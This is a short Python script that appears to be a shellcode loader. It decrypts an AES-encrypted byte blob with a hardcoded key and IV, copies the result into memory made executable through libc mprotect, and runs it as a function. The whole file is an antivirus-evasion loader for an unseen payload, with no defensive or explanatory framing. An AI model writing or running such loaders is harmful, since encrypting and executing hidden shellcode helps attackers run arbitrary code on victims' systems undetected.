from Crypto.Cipher import AES
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys



shellcode = "\xcd\x02\x51\x8f\x9b\x96\xbc\x9a\xff\x7a\x35\x0a\xc0\x81\x5d\x92\x44\x13\x35\x3e\x7a\x60\x11\x81\x1e\xe0\x5a\x62\x5c\x8d\xdd\xde\xdb\x17\x93\x5a\x8f\x1b\xd2\xfb\x1f\x74\xb9\xf8\x88\xd6\x34\x7e"
paddingLen = 5

obj2 = AES.new('This is a key123', AES.MODE_CBC, "1234567812345678")
decrypt = obj2.decrypt(shellcode)
decrypt = decrypt[:-paddingLen]


libc = CDLL('libc.so.6')
sc = c_char_p(decrypt)
size = len(decrypt)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
